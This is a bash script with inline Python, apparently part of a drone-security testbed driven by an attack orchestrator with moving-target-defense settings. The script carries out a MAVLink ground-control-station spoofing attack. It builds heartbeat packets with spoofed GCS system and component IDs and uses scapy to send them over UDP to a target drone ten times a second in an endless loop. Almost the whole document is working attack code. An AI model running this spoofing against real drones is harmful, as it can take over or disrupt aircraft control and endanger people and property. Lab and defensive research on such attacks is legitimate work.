#!/usr/bin/env bash
# Auto-generated from: Ground-Control-Station-Spoofing.md
set -euo pipefail

# MTD_INTERFACE_START
# =======================================================================
# MTD 환경 변수를 통한 동적 타겟 획득
if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
    echo "ERROR: TARGET_IP and TARGET_PORT environment variables are not set." >&2
    echo "Attack aborted. Must be run via attack_orchestrator.py with MTD state resolution." >&2
    exit 1
fi

# 서비스 타입에 따라 TARGET_PORT 기본값 설정
# GCS Spoofing은 드론(DRONE_MAVLINK)을 향해 Heartbeat를 전송하므로 UDP 14550을 가정합니다.
case "${TARGET_SERVICE:-DRONE_MAVLINK}" in
  DRONE_MAVLINK)
    TARGET_PORT="${TARGET_PORT:-14550}" # 기본 MAVLink UDP 포트
    ;;
  *)
    :
    ;;
esac

echo "[INFO] Attack target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-DRONE_MAVLINK})"
# MTD_INTERFACE_END

# 기준 경로 및 로깅 설정
export BASE="${BASE:-$PWD}"
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
    log(){ echo "[$(date +%F_%T)] $*"; }; export -f log
fi

log "[ATTACK] id=ground-control-station-spoofing src=Ground-Control-Station-Spoofing.md"
log "[BLOCK 1] type=python (Inline GCS Heartbeat Spoofing Script)"

# MAVLink Heartbeat Spoofing을 통해 드론에게 자신이 GCS임을 알리는 Python 인라인 스크립트 실행
python3 -u - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
import os, sys
import time
from pymavlink import mavutil
from scapy.all import *

# --- Argument Parsing from Shell ---
if len(sys.argv) <= 1:
    target_ip = os.environ.get('TARGET_IP', '127.0.0.1')
    target_port = os.environ.get('TARGET_PORT', '14550')
    sys.argv = [sys.argv[0], f"{target_ip}:{target_port}"]

try:
    target_ip, target_port_str = sys.argv[1].split(':', 1)
    target_port = int(target_port_str)
except Exception as e:
    print(f"[ERROR] Invalid target address format: {sys.argv[1]}. Error: {e}", file=sys.stderr)
    sys.exit(1)
# -----------------------------------

def create_gcs_heartbeat():
    """GCS(Ground Control Station) 역할을 하는 Heartbeat 메시지를 생성합니다."""
    mav = mavutil.mavlink.MAVLink(None)
    # Source System/Component ID를 GCS 값으로 설정하여 스푸핑
    mav.srcSystem = 255 
    mav.srcComponent = 190 
    return mav.heartbeat_encode(
        type=mavutil.mavlink.MAV_TYPE_GCS, # GCS 타입
        autopilot=mavutil.mavlink.MAV_AUTOPILOT_GENERIC,
        base_mode=0,
        custom_mode=0,
        system_status=mavutil.mavlink.MAV_STATE_ACTIVE
    ).pack(mav)

def send_mavlink_packet(packet_data, target_ip, target_port):
    """Scapy를 사용하여 UDP 기반 MAVLink 패킷을 전송합니다."""
    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
    send(packet, verbose=False)

if __name__ == "__main__":
    print(f"[INFO] Starting GCS Heartbeat Spoofing to UDP {target_ip}:{target_port}")

    while True:
        send_mavlink_packet(create_gcs_heartbeat(), target_ip, target_port)
        time.sleep(0.1) # 공격 속도 조절
PY

log "[BLOCK 2] type=control (Foreground Execution)"
log "Attack running in foreground Python loop; orchestrator is responsible for lifecycle (SIGTERM/timeout)."